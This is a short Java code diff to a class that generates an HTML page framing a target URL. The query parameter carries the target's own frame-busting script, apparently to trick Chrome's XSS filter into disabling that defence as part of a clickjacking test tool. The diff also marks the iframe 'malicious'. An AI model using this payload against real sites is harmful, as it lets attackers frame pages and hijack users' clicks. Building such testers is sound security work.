@@ -14,7 +14,7 @@ public class FilterXssChrome implements ClickJacking{
 	
 	public FilterXssChrome(String src){
 		this.src = src;
-		f = new File("src\\main\\webapp\\filter_xss_chrome.html");
+		f = new File("src\\main\\webapp\\html_generated\\filter_xss_chrome.html");
 	}
 	
 	@Override
@@ -43,7 +43,7 @@ public class FilterXssChrome implements ClickJacking{
 	public void creation() throws IOException {
         BufferedWriter bw = new BufferedWriter(new FileWriter(f));
         bw.write("<html><body>");
-        bw.write("<iframe src=\"" + src + "\\?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D\"" + "></iframe>");
+        bw.write("<iframe src=\"" + src + "\\?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D\"" + " class=\"malicious\"></iframe>");
         bw.write("</body></html>");
         bw.close();		
         System.out.println(f.getAbsolutePath());
@@ -55,3 +55,4 @@ public class FilterXssChrome implements ClickJacking{
 	}
 	
 }
+
